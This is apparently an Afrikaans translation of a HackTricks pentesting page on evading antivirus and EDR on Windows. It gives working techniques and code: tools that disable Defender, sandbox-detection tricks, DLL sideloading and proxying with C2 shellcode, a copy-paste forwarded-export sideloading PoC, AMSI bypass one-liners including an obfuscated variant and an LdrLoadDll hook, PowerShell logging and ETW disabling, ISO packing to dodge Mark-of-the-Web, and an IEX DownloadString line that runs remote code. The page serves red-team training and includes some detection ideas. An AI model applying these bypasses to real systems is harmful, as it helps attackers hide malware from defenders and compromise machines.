# Antivirus (AV) Omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n hulpmiddel om Windows Defender te laat ophou werk.
- [no-defender](https://github.com/es3n1n/no-defender): 'n hulpmiddel om Windows Defender te laat ophou werk deur 'n ander AV te fingeer.
- [Deaktiveer Defender as jy admin is](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Tans gebruik AVs verskillende metodes om te kontroleer of 'n lêer kwaadwillig is of nie: static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende kwaadwillige strings of lokusse van bytes in 'n binêre of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan laat vasloop, aangesien dit waarskynlik al geanaliseer en as kwaadwillig gemerk is. Daar is 'n paar maniere om hierdie soort deteckie te omseil:

- **Encryption**

As jy die binêre enkripteer, sal daar geen manier wees vir AV om jou program te detecteer nie, maar jy sal 'n soort loader nodig hê om die program in geheue te ontsleutel en te hardloop.

- **Obfuscation**

Soms is dit alles wat nodig is om sommige strings in jou binêre of script te verander om by AV verby te kom, maar dit kan tydrowend wees afhangend van wat jy probeer obfuskeer.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> 'n Goeie manier om teen Windows Defender static detection te toets is ThreatCheck (https://github.com/rasta-mouse/ThreatCheck). Dit split die lêer basies in meerdere segmente en laat Defender elkeen individueel skandeer; op dié manier kan dit jou presies vertel watter strings of bytes in jou binêre gemerk word.

Ek beveel sterk aan dat jy hierdie YouTube playlist (https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion nakyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binêre in 'n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou blaaier se wagwoorde te ontsleutel en te lees, 'n minidump op LSASS te doen, ens.). Hierdie deel kan 'n bietjie moeiliker wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit 'n uitstekende manier wees om AV se dynamic analysis te omseil. AV's het 'n baie kort tyd om lêers te skandeer sodat dit nie die gebruiker se werkvloei onderbreek nie, so die gebruik van lang sleeps kan die analise van binêre ontwrig. Die probleem is dat baie AV sandboxe net die sleep kan oorslaan afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Gewoonlik het sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou dit die gebruiker se masjien kon vertraag. Jy kan hier ook baie kreatief raak, byvoorbeeld deur die CPU se temperatuur of selfs die fan-snelhede na te gaan — nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy 'n gebruiker wil teiken wie se werkstasie by die "contoso.local" domain aangesluit is, kan jy 'n kontrol doen op die rekenaar se domain om te sien of dit by die een wat jy spesifiseer pas; as dit nie doen nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se Sandbox rekenaam HAL9TH is, so jy kan vir die rekenaam in jou malware nagaan voordat detonasie plaasvind; as die naam HAL9TH ooreenstem, beteken dit jy is binne Defender se sandbox, en jy kan jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog 'n paar uitstekende wenke van [@mgeeky](https://twitter.com/mariuszbit) om teen Sandboxes te werk

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons vroeër in hierdie pos gesê het, sal **public tools** uiteindelik **gedetecteer** word, so jy moet jouself iets vra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik die laasgenoemde. Neem mimikatz as 'n voorbeeld — dit is waarskynlik een van, indien nie die mees gemerkte stukke malware deur AVs en EDRs nie; terwyl die projek self baie gaaf is, is dit ook 'n nagmerrie om daarmee te werk om om AVs te kom, so kyk net vir alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir omseiling wysig, maak seker dat jy **automatic sample submission** in Defender afskakel, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel is om op die lang duur omseiling te bereik. As jy wil nagaan of jou payload deur 'n bepaalde AV gedetecteer word, installeer dit op 'n VM, probeer om die automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar dit moontlik is, prioritiseer altyd die gebruik van DLLs vir omseiling — in my ervaring word DLL-lêers gewoonlik baie minder gedetecteer en geanaliseer, so dit is 'n baie eenvoudige truuk om in sekere gevalle deteksie te voorkom (as jou payload natuurlik 'n manier het om as 'n DLL te loop).

Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n detectiekoers van 4/26 op antiscan.me, terwyl die EXE payload 'n 7/26 detectiekoers het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nou sal ons 'n paar truuks wys wat jy met DLL-lêers kan gebruik om baie meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak voordeel van die DLL search order wat deur die loader gebruik word deur beide die slagoffer-toepassing en kwaadwillige payload(s) langs mekaar te posisioneer.

Jy kan programme wat vatbaar is vir DLL Sideloading nagaan met behulp van Siofra (https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys programme wat binne "C:\Program Files\\" kwesbaar is vir DLL hijacking, en die DLL-lêers wat hulle probeer laai, uitset.

Ek beveel sterk aan dat jy **verken DLL Hijackable/Sideloadable programs self**. Hierdie tegniek is nogal stealthy as dit behoorlik gedoen word, maar as jy publiek-bekende DLL Sideloadable programs gebruik, kan jy maklik raakgevang word.

Slegs deur 'n malicious DLL met die naam wat 'n program verwag om te laai te plaas, beteken nie dat dit jou payload sal uitvoer nie, want die program verwag sekere spesifieke funksies binne daardie DLL. Om hierdie probleem op te los, sal ons 'n ander tegniek gebruik genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (and malicious) DLL na die oorspronklike DLL, sodoende die program se funksionaliteit behou en die uitvoering van jou payload kan hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL source code template, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26-detectiekoers op [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons meer in-diepte bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan om na kode te verwys, bevat die export-inskrywing 'n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer 'n caller die export oplos, sal die Windows loader:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Belangrike gedragspunte om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit verskaf uit die beskermde KnownDLLs namespace (bv., ntdll, kernelbase, ole32).
- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids van die module insluit wat die forward-resolusie uitvoer.

Dit maak 'n indirekte sideloading-primitive moontlik: vind 'n gesigneerde DLL wat 'n funksie exporteer wat na 'n nie-KnownDLL-modulenaam ge-forward is, en plaas daardie gesigneerde DLL in dieselfde gids as 'n attacker-controlled DLL wat presies benoem is soos die forwarded target module. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL uit dieselfde gids, en voer jou DllMain uit.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, en word dus volgens die normale soekorde opgelos.

PoC (copy-paste):
1) Kopieer die getekende stelsel DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die deurgestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktiveer die forward met 'n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, sal jy eers 'n "missing API" fout kry nadat `DllMain` reeds uitgerun het

Jagwenke:
- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opnoem met gereedskap soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporing/verdediging-idees:
- Monitor LOLBins (e.g., rundll32.exe) wat gesigneerde DLLs van nie-stelselpaaie laai, gevolg deur die laai van non-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Waarsku op proses-/module-kettinge soos: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikers-skryfbare paaie
- Handhaaf code-integriteitsbeleid (WDAC/AppLocker) en weier skryf+uitvoer in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n payload toolkit vir die omseiling van EDRs deur gebruik te maak van suspended processes, direct syscalls, en alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n onopvallende wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net ’n kat-en-muis-speletjie — wat vandag werk kan môre ontdek word, dus moet jy nooit net op een hulpmiddel staatmaak nie; indien moontlik, probeer om verskeie ontduikingsmetodes aan mekaar te koppel.

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik was AVs slegs in staat om **lêers op skyf** te skandeer, so as jy op een of ander manier payloads **direk in geheue** kon uitvoer, kon die AV niks doen om dit te keer nie, omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in die volgende komponente van Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit stel antivirusoplossings in staat om skripgedrag te ondersoek deur skrip-inhoud bloot te lê in ’n vorm wat ongeënkripteerd en sonder obfuskasie is.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` vooran sit en dan die pad na die uitvoerbare lêer waarvandaan die skrip gedraai is — in hierdie geval, powershell.exe

Ons het geen lêer op die skyf afgegee nie, maar is steeds in die geheue gevang weens AMSI.

Boonop, vanaf **.NET 4.8**, word C# code ook deur AMSI verwerk. Dit beïnvloed selfs `Assembly.Load(byte[])` vir in-geheue uitvoering. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) te gebruik vir in-geheue uitvoering as jy AMSI wil ontduik.

Daar is ’n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese detecties werk, kan die wysiging van die skripte wat jy probeer laai ’n goeie manier wees om detectie te ontduik.

Egter, AMSI het die vermoë om skripte te deobfuskeer selfs al het dit meerdere lae, so obfuscation kan ’n slegte opsie wees afhangend van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te ontduik nie. Soms hoef jy egter net ’n paar veranderlike name te verander en jy is goed, so dit hang af van hoe ernstig iets geflag is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur ’n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer, selfs terwyl jy as ’n onprivilegieerde gebruiker loop. As gevolg van hierdie fout in die implementering van AMSI, het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forcing an Error**

Die dwing van die AMSI-initialisering om te misluk (amsiInitFailed) sal daartoe lei dat geen skandering vir die huidige proses geïnisieer word nie. Dit is oorspronklik ontbloot deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het ’n signature ontwikkel om breër gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles wat dit vereis het, was een reël powershell code om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self aangemerk, dus is 'n paar wysigings nodig om hierdie tegniek te gebruik.

Hier is 'n gemodifiseerde AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gevlag sal word sodra hierdie pos uitkom, so jy moet nie enige code publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Aantekeninge
- Werk oor PowerShell, WScript/CScript en custom loaders ewe goed (enige iets wat andersins AMSI sou laai).
- Kombineer dit met die voorsiening van skripte oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang command‑line artefakte te vermy.
- Gesien gebruik deur loaders wat uitgevoer word via LOLBins (bv., `regsvr32` wat `DllRegisterServer` aanroep).

Hierdie hulpmiddel [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) genereer ook 'n skrip om AMSI te omseil.

**Verwyder die gedetekteerde handtekening**

Jy kan 'n hulpmiddel gebruik soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** om die gedetekteerde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses te skandeer vir die AMSI-handtekening en dit dan te oor skryf met NOP-instruksies, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is 'n funksie wat jou toelaat om alle PowerShell-opdragte wat op 'n stelsel uitgevoer word te log. Dit kan nuttig wees vir ouditering en foutopsporing, maar dit kan ook 'n **probleem vir aanvallers wees wat opsporing wil ontduik**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder deur AMSI geskandeer te word. Jy kan dit so doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell te spawn sonder verdediging (dit is wat `powerpick` from Cobal Strike uses).

## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke berus op die enkripsie van data, wat die entropie van die binêre sal verhoog en dit makliker vir AVs en EDRs maak om dit op te spoor. Wees versigtig hiermee en oorweeg om enkripsie slegs op spesifieke gedeeltes van jou kode toe te pas wat sensitief is of versteek moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te kry wat dekompilers en sandboxes sal blokkeer. Die workflow hieronder herstel betroubaar 'n byna–oorspronklike IL wat daarna na C# gedecompileer kan word in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering removal – ConfuserEx enkripteer elke *method body* en dekodeer dit binne die *module* static constructor (`<Module>.cctor`). Dit patch ook die PE checksum sodat enige wysiging die binêre laat kras. Gebruik **AntiTamperKiller** om die enkripteerde metadata-tabelle te lokaliseer, die XOR-sleutels te herstel en 'n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die uitvoer bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* lêer deur **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profiel  
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlike name herstel en konstante stringe dekodeer.

3.  Proxy-call stripping – ConfuserEx vervang direkte metode-oproepe met liggewig wrappers (a.k.a *proxy calls*) om dekompilasie verder te breek. Verwyder hulle met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondoorgrondelike wrapper-funksies (`Class8.smethod_10`, …).

4.  Manual clean-up – loop die resulterende binêre in dnSpy, soek na groot Base64-blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload te lokaliseer. Dikwels stoor die malware dit as 'n TLV-gekodeerde byte-array geïnitialiseer binne `<Module>.byte_0`.

Die bogenoemde ketting herstel die uitvoeringsvloei **sonder** om die kwaadaardige monster te laat loop – nuttig wanneer jy op 'n aflyn werkstasie werk.

> 🛈  ConfuserEx produseer 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triage.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) compilasie-suite te verskaf wat verhoogde sagtewaresekuriteit moontlik maak deur middel van [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om by compile-time obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik of die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag obfuscated operations by wat gegenereer word deur die C++ template metaprogramming framework wat die lewe van iemand wat die toepassing wil crack 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat in staat is om verskeie verskillende pe files te obfuskeer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitraire uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fine-grained code obfuscation framework vir LLVM-supported languages wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscates 'n program op die assembly code level deur gewone instruksies in ROP chains te transformeer, wat ons natuurlike beskouing van normale control flow verhoed.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL omskakel na shellcode en dit dan laai

## SmartScreen & MoTW

Jy het moontlik hierdie skerm gesien wanneer jy sekere uitvoerbare lêers van die internet af aflaai en dit uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van potensieel kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat seldsaam afgelaaide toepassings SmartScreen sal aktiveer en sodoende die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur op More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om op te let dat uitvoerbare lêers wat met 'n **trusted** signing certificate geteken is **nie SmartScreen sal aktiveer** nie.

'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om hulle in 'n soort houer soos 'n ISO te plaas. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **non NTFS** volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in uitvoerhouers inpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo om SmartScreen te omseil deur payloads binne ISO-lêers te verpakk met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logboekmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeure te registreer**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.

Soos hoe AMSI gedeaktiveer (omseil) kan word, is dit ook moontlik om die **`EtwEventWrite`** funksie van die user space-proses dadelik te laat terugkeer sonder om enige gebeure te registreer. Dit word bereik deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, wat ETW-logging vir daardie proses effektief deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

